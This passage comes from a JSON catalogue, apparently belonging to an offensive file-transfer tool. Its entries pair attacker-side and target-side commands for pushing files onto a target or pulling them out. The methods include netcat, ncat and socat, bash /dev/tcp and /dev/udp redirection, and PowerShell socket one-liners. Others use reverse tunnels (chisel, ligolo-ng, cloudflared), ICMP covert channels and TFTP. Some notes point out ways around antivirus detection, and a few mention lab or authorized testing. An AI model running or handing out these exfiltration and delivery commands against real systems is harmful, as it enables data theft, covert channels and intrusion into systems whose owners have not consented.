        "text": "nc -q 0 {rhost} {lport} < \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "nc.exe"
    ],
    "note": {
      "en": "The target listens. The inbound port must be reachable and allowed by Windows Firewall.",
      "ru": "Цель слушает. Входящий порт должен быть доступен и разрешён в Windows Firewall."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-win-deliver",
    "title": "netcat.exe reverse (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "nc",
    "family": "reverse",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "nc.exe -q 0 {lhost} {lport} > \"{remotefile}\""
      }
    ],
    "requires": [
      "nc.exe"
    ],
    "note": {
      "en": "Drop nc.exe on the target first; Windows does not ship netcat. AV commonly flags nc.exe.",
      "ru": "Сначала положите nc.exe на цель: в Windows нет штатного netcat. AV часто детектит nc.exe."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "bash-devtcp-exfil",
    "title": "bash /dev/tcp (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nc",
    "family": "shell",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cat \"{remotefile}\" > /dev/tcp/{lhost}/{lport}"
      }
    ],
    "requires": [
      "bash",
      "nc"
    ],
    "note": {
      "en": "Pure bash redirection; cat is optional. The receiver is a normal netcat listener on LHOST.",
      "ru": "Чистое перенаправление bash; cat не обязателен. На LHOST работает обычный netcat-приёмник."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-bind-exfil",
    "title": "netcat bind (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nc",
    "family": "bind",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 < \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -q 0 {rhost} {lport} > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "nc"
    ],
    "note": {
      "en": "The target listens and serves the file; LHOST connects and writes it. Use it when the target cannot dial out.",
      "ru": "Цель слушает и отдаёт файл; LHOST подключается и записывает его. Используйте, когда цель не может сама стучаться наружу."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-exfil",
    "title": "netcat reverse (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nc",
    "family": "reverse",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -q 0 {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "nc"
    ],
    "note": {
      "en": "The target connects back and sends the file. Without -q 0 or -N the receiver can hang after EOF.",
      "ru": "Цель подключается обратно и отправляет файл. Без -q 0 или -N приёмник может зависнуть после EOF."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ps-tcp-exfil",
    "title": "PowerShell TcpClient (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nc",
    "family": "powershell",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$b=[IO.File]::ReadAllBytes(\"{remotefile}\");$c=New-Object Net.Sockets.TcpClient(\"{lhost}\",{lport});$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Flush();$s.Close();$c.Close()"
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "The target sends the file with .NET sockets. This avoids dropping nc.exe and often bypasses AV that only flags netcat.",
      "ru": "Цель отправляет файл через сокеты .NET. Не нужно класть nc.exe, и часто обходится AV, который ловит только netcat."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-tar-exfil",
    "title": "tar over netcat (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nc",
    "family": "stream",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 | tar xzf - -C \"{lhostpath}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tar czf - \"{remotefile}\" | nc -q 0 {lhost} {lport}"
      }
    ],
    "requires": [
      "nc",
      "tar"
    ],
    "note": {
      "en": "Streams a directory from the target and unpacks it on LHOST. -q 0 / -N is mandatory or tar never sees EOF.",
      "ru": "Передаёт каталог с цели и распаковывает на LHOST. -q 0 / -N обязателен, иначе tar не увидит EOF."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-udp-exfil",
    "title": "UDP with /dev/udp (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nc",
    "family": "udp",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -u -lvnp {lport} > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cat \"{remotefile}\" > /dev/udp/{lhost}/{lport}"
      }
    ],
    "requires": [
      "nc",
      "bash"
    ],
    "note": {
      "en": "UDP has no delivery guarantees. Use it only for small files or strings, and compress large data first.",
      "ru": "UDP не гарантирует доставку. Используйте только для небольших файлов или строк, а большие данные сжимайте заранее."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "nc-base64-exfil",
    "title": "base64 over netcat (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "nc",
    "family": "stream",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{lhostpath}/{file}.b64\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "base64 -w0 \"{remotefile}\" | nc -q 0 {lhost} {lport}"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.b64\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "nc",
      "base64"
    ],
    "note": {
      "en": "Moves the file as text for fussy channels, then decodes it on LHOST. base64 adds roughly 33% overhead.",
      "ru": "Передаёт файл текстом для капризных каналов, затем декодирует на LHOST. base64 добавляет около 33% объёма."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-win-bind-exfil",
    "title": "netcat.exe bind (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nc",
    "family": "bind",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "nc.exe -lvnp {lport} < \"{remotefile}\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -q 0 {rhost} {lport} > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "nc.exe"
    ],
    "note": {
      "en": "The target listens and serves one file. The port must be allowed inbound on RHOST.",
      "ru": "Цель слушает и отдаёт один файл. Входящий порт должен быть разрешён на RHOST."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-win-exfil",
    "title": "netcat.exe reverse (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nc",
    "family": "reverse",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "nc.exe -q 0 {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "nc.exe"
    ],
    "note": {
      "en": "nc.exe on the target sends the file back. Check the hash after transfer.",
      "ru": "nc.exe на цели отправляет файл обратно. После передачи сравните hash."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ps-tcp-bind-exfil",
    "title": "PowerShell TcpListener (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nc",
    "family": "powershell",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{lport});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=[IO.File]::ReadAllBytes(\"{remotefile}\");$s.Write($b,0,$b.Length);$s.Flush();$s.Close();$c.Close();$l.Stop()"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -q 0 {rhost} {lport} > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "PowerShell",
      ".NET"
    ],
    "note": {
      "en": "The target listens with .NET and sends one file when LHOST connects. The inbound port must be open.",
      "ru": "Цель слушает через .NET и отдаёт один файл, когда подключается LHOST. Входящий порт должен быть открыт."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "nc-base64-win-exfil",
    "title": "base64 over netcat (Windows exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "nc",
    "family": "stream",
    "priority": 30,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} -q 0 > \"{lhostpath}/{file}.b64\""
      },
      {
        "side": "rhost",
        "shell": "powershell",
        "text": "$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes(\"{remotefile}\"));$c=New-Object Net.Sockets.TcpClient(\"{lhost}\",{lport});$w=New-Object IO.StreamWriter($c.GetStream());$w.Write($b64);$w.Flush();$c.Close()"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "base64 -d \"{lhostpath}/{file}.b64\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "PowerShell",
      ".NET",
      "base64"
    ],
    "note": {
      "en": "PowerShell builds the base64 string and writes it to a raw TCP socket; LHOST decodes it.",
      "ru": "PowerShell собирает base64-строку и пишет её в сырой TCP-сокет; LHOST декодирует."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-deliver",
    "title": "ncat reverse (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "ncat",
    "family": "reverse",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat -lvnp {lport} < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ncat {lhost} {lport} > \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat"
    ],
    "note": {
      "en": "ncat from the nmap package. The receiver closes on EOF without extra flags.",
      "ru": "ncat из пакета nmap. Приёмник закрывается по EOF без дополнительных флагов."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-tls-deliver",
    "title": "ncat TLS (download)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "ncat",
    "family": "tls",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat --ssl -lvnp {lport} < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ncat --ssl {lhost} {lport} > \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat"
    ],
    "note": {
      "en": "ncat generates an ephemeral certificate when --ssl is used without cert/key. The client does not verify it by default.",
      "ru": "ncat создаёт временный сертификат, если --ssl указан без cert/key. Клиент по умолчанию его не проверяет."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-win-deliver",
    "title": "ncat.exe reverse (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "ncat",
    "family": "reverse",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat -lvnp {lport} < \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "ncat.exe {lhost} {lport} > \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat.exe"
    ],
    "note": {
      "en": "Copy ncat.exe from the nmap package to the target. It is a single static binary.",
      "ru": "Скопируйте ncat.exe из пакета nmap на цель. Это один статический бинарник."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-exfil",
    "title": "ncat reverse (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ncat",
    "family": "reverse",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat -lvnp {lport} > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ncat {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat"
    ],
    "note": {
      "en": "Plain TCP with ncat. Use the TLS family when the channel must be encrypted.",
      "ru": "Обычный TCP через ncat. Если канал нужно шифровать, используйте семейство TLS."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-tls-exfil",
    "title": "ncat TLS (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ncat",
    "family": "tls",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat --ssl -lvnp {lport} > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ncat --ssl {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat"
    ],
    "note": {
      "en": "Encrypted raw TCP with ncat. Use --ssl-cert and --ssl-key on the listener if you need a stable certificate.",
      "ru": "Шифрованный сырой TCP через ncat. Для постоянного сертификата добавьте --ssl-cert и --ssl-key на приёмнике."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-acl-exfil",
    "title": "ncat with IP allowlist (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "ncat",
    "family": "acl",
    "priority": 10,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat -lvnp {lport} --allow {rhost} > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ncat {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat"
    ],
    "note": {
      "en": "The listener accepts only RHOST. Useful when the port is exposed to a shared lab network.",
      "ru": "Приёмник принимает только RHOST. Полезно, когда порт виден в общей лабораторной сети."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-win-exfil",
    "title": "ncat.exe reverse (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ncat",
    "family": "reverse",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat -lvnp {lport} > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "ncat.exe {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat.exe"
    ],
    "note": {
      "en": "The target sends the file over plain TCP. Swap to --ssl on both sides for TLS.",
      "ru": "Цель отправляет файл по обычному TCP. Для TLS добавьте --ssl с обеих сторон."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "ncat-tls-exfil-win",
    "title": "ncat.exe TLS (Windows exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "exfil",
    "channel": "ncat",
    "family": "tls",
    "priority": 20,
    "source": "07",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "ncat --ssl -lvnp {lport} > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "ncat.exe --ssl {lhost} {lport} < \"{remotefile}\""
      }
    ],
    "requires": [
      "ncat.exe"
    ],
    "note": {
      "en": "TLS from a Windows target with ncat.exe. The listener must also use --ssl.",
      "ru": "TLS с Windows-цели через ncat.exe. Приёмник тоже должен быть запущен с --ssl."
    },
    "docs": "docs/en/07-netcat.md"
  },
  {
    "id": "socat-deliver",
    "title": "socat TCP (download)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "socat",
    "family": "tcp",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "socat -u FILE:\"{lhostpath}/{file}\" TCP-LISTEN:{lport},reuseaddr,fork"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "socat -u TCP:{lhost}:{lport} OPEN:\"{remotefile}\",creat"
      }
    ],
    "requires": [
      "socat"
    ],
    "note": {
      "en": "socat serves the file over plain TCP. -u makes the channel one-way from LHOST to RHOST.",
      "ru": "socat раздаёт файл по обычному TCP. -u делает канал однонаправленным от LHOST к RHOST."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "socat-tls-deliver",
    "title": "socat TLS (download)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "socat",
    "family": "tls",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "socat -u FILE:\"{lhostpath}/{file}\" OPENSSL-LISTEN:{lport},cert=server.pem,verify=0,reuseaddr,fork"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "socat -u OPENSSL:{lhost}:{lport},verify=0 OPEN:\"{remotefile}\",creat"
      }
    ],
    "requires": [
      "socat",
      "openssl"
    ],
    "note": {
      "en": "TLS delivery with the self-signed server.pem from the pipeline. verify=0 is lab-only.",
      "ru": "TLS-доставка с самоподписанным server.pem из пайплайна. verify=0 только для лаборатории."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "socat-exfil",
    "title": "socat TCP (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "socat",
    "family": "tcp",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "socat -u TCP-LISTEN:{lport},reuseaddr,fork OPEN:\"{lhostpath}/{file}\",creat,append"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "socat -u FILE:\"{remotefile}\" TCP:{lhost}:{lport}"
      }
    ],
    "requires": [
      "socat"
    ],
    "note": {
      "en": "The receiver appends to the file and survives reconnects. Stop it after the transfer.",
      "ru": "Приёмник дописывает в файл и переживает переподключения. Остановите его после передачи."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "socat-tls",
    "title": "socat TLS (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "socat",
    "family": "tls",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "socat OPENSSL-LISTEN:{lport},cert=server.pem,verify=0,reuseaddr,fork OPEN:\"{lhostpath}/{file}\",creat,append"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "socat -u FILE:\"{remotefile}\" OPENSSL:{lhost}:{lport},verify=0"
      }
    ],
    "requires": [
      "socat",
      "openssl"
    ],
    "note": {
      "en": "A raw TLS channel. Generate server.pem first and use it only in a lab or authorized test.",
      "ru": "Сырой TLS-канал. Сначала создайте server.pem и используйте только в лаборатории или авторизованном тесте."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "socat-udp-exfil",
    "title": "socat UDP (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "socat",
    "family": "udp",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "socat -u UDP-RECV:{lport},reuseaddr OPEN:\"{lhostpath}/{file}\",creat,append"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "socat -u FILE:\"{remotefile}\" UDP:{lhost}:{lport}"
      }
    ],
    "requires": [
      "socat"
    ],
    "note": {
      "en": "UDP has no acknowledgements or retransmits. Use it for small files only.",
      "ru": "В UDP нет подтверждений и повторов. Используйте только для небольших файлов."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "openssl-nc-exfil",
    "title": "OpenSSL AES + netcat (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "openssl",
    "family": "stream",
    "priority": 20,
    "source": "11",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp {lport} | openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -base64 -pass pass:'{rhost_pass}' > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -base64 -pass pass:'{rhost_pass}' -in \"{remotefile}\" | nc {lhost} {lport}"
      }
    ],
    "requires": [
      "openssl",
      "nc"
    ],
    "note": {
      "en": "AES-256-CBC without a MAC does not verify integrity. Compare the hash after transfer and use a strong password.",
      "ru": "AES-256-CBC без MAC не проверяет целостность. Сравните hash после передачи и используйте надёжный пароль."
    },
    "docs": "docs/en/11-encryption.md"
  },
  {
    "id": "chisel",
    "title": "chisel reverse tunnel",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "chisel server -p {lport} --reverse"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -m http.server 8081"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "chisel client http://{lhost}:{lport} R:8081:127.0.0.1:8081"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "curl -O \"http://127.0.0.1:8081/{file}\""
      }
    ],
    "requires": [
      "chisel",
      "python3"
    ],
    "note": {
      "en": "Run the target HTTP server from the directory that contains the file. The tunnel avoids inbound access to the target.",
      "ru": "Запускайте HTTP-сервер на цели из каталога с файлом. Туннель не требует входящего доступа к цели."
    },
    "docs": "docs/en/02-target-to-attacker.md",
    "channel": "tunnel",
    "family": "chisel",
    "priority": 10
  },
  {
    "id": "cloudflared",
    "title": "cloudflared public URL",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "tunnel",
    "family": "cloudflared",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -m http.server 8000"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "cloudflared tunnel --url http://localhost:8000"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "curl -O \"https://<issued-url>/{file}\""
      }
    ],
    "requires": [
      "cloudflared"
    ],
    "note": {
      "en": "cloudflared prints the public URL. Replace <issued-url> manually; no inbound port on the target is needed.",
      "ru": "cloudflared печатает публичный URL. Замените <issued-url> вручную; входящий порт на цели не нужен."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "ligolo-ng",
    "title": "ligolo-ng reverse tunnel",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "tunnel",
    "family": "ligolo",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "./ligolo-proxy -selfcert -laddr 0.0.0.0:11601"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "./agent -connect {lhost}:11601 -ignore-cert"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp {rhost_user}@240.0.0.1:\"{remotefile}\" \"{lhostpath}/\""
      }
    ],
    "requires": [
      "ligolo-ng",
      "openssh-client"
    ],
    "note": {
      "en": "Start the proxy, connect the agent, then create and start the ligolo interface in the proxy console. The scp step uses the tunnel address 240.0.0.1.",
      "ru": "Запустите прокси, подключите агента, затем создайте и поднимите интерфейс ligolo в консоли прокси. Шаг scp использует адрес туннеля 240.0.0.1."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "ssh-r-tunnel",
    "title": "ssh -R reverse forward",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "tunnel",
    "family": "ssh",
    "priority": 10,
    "source": "02",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "ssh -R 2222:127.0.0.1:22 {lhost_user}@{lhost} -N"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "scp -P 2222 {rhost_user}@127.0.0.1:\"{remotefile}\" \"{lhostpath}/\""
      }
    ],
    "requires": [
      "openssh-client",
      "sshd"
    ],
    "note": {
      "en": "RHOST forwards its own SSH port to LHOST:2222; then pull the file through 127.0.0.1. Requires SSH credentials on both sides.",
      "ru": "RHOST пробрасывает свой SSH-порт на LHOST:2222; затем файл забирается через 127.0.0.1. Нужны SSH-учётки с обеих сторон."
    },
    "docs": "docs/en/02-target-to-attacker.md"
  },
  {
    "id": "hping3-icmp",
    "title": "hping3 ICMP payload",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "icmp",
    "family": "stream",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sudo hping3 {lhost} --listen signature --safe --icmp > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo hping3 {lhost} -1 -E \"{remotefile}\" --sign signature --safe"
      }
    ],
    "requires": [
      "hping3",
      "root"
    ],
    "note": {
      "en": "Puts the file into ICMP echo payloads. --safe adds ordering and retransmission; it is slower but avoids manual stitching.",
      "ru": "Кладёт файл в payload ICMP echo. --safe добавляет порядок и повторы; медленнее, но не нужно склеивать вручную."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "icmp-exfil",
    "title": "ICMP file transfer",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "source": "12",
    "server": {
      "shell": "bash",
      "text": "sudo python3 scripts/icmp/icmp_recv.py -o {lhostpath}/{file}"
    },
    "client": [
      {
        "shell": "bash",
        "text": "sudo python3 icmp_send.py {lhost} \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "scapy",
      "root"
    ],
    "note": {
      "en": "Sends the file over ICMP echo requests from RHOST to LHOST. Copy icmp_send.py to RHOST first; there are no ACKs or retransmits.",
      "ru": "Отправляет файл через ICMP echo requests с RHOST на LHOST. Сначала скопируйте icmp_send.py на RHOST; ACK и повторов нет."
    },
    "docs": "docs/en/12-dns-icmp.md",
    "channel": "icmp",
    "family": "script",
    "priority": 10
  },
  {
    "id": "ptunnel-ng",
    "title": "ptunnel-ng (TCP over ICMP)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "icmp",
    "family": "tunnel",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "sudo ./src/ptunnel-ng -r127.0.0.1 -R9000"
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "nc -lvnp 9000 > \"{lhostpath}/{file}\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "sudo ./src/ptunnel-ng -p{lhost} -l8000 -r127.0.0.1 -R9000"
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "nc -w3 127.0.0.1 8000 < \"{remotefile}\""
      }
    ],
    "requires": [
      "ptunnel-ng",
      "nc",
      "root"
    ],
    "note": {
      "en": "Build ptunnel-ng on LHOST, copy the client to RHOST, then start the proxy before the netcat pair. Windows needs Npcap.",
      "ru": "Соберите ptunnel-ng на LHOST, скопируйте клиент на RHOST и запустите прокси до пары netcat. В Windows нужен Npcap."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "tftp-linux-deliver",
    "title": "TFTP download (Linux)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "tftp",
    "family": "native",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tftp {lhost} -c get {file} \"{remotefile}\""
      }
    ],
    "requires": [
      "tftp"
    ],
    "note": {
      "en": "tftp-hpa syntax. The server must already expose the file from /tftp.",
      "ru": "Синтаксис tftp-hpa. Сервер уже должен отдавать файл из /tftp."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "tftp-win-deliver",
    "title": "TFTP download (Windows)",
    "profiles": [
      "exotic"
    ],
    "os": "windows",
    "direction": "deliver",
    "channel": "tftp",
    "family": "native",
    "priority": 10,
    "source": "12",
    "steps": [
      {
        "side": "rhost",
        "shell": "cmd",
        "text": "tftp -i {lhost} GET {file} \"{remotefile}\""
      }
    ],
    "requires": [
      "tftp"
    ],
    "note": {
      "en": "Windows tftp.exe is an optional component; -i is required for binary files.",
      "ru": "tftp.exe в Windows — опциональный компонент; для бинарных файлов обязателен -i."
    },
    "docs": "docs/en/12-dns-icmp.md"
  },
  {
    "id": "tftp-linux-exfil",
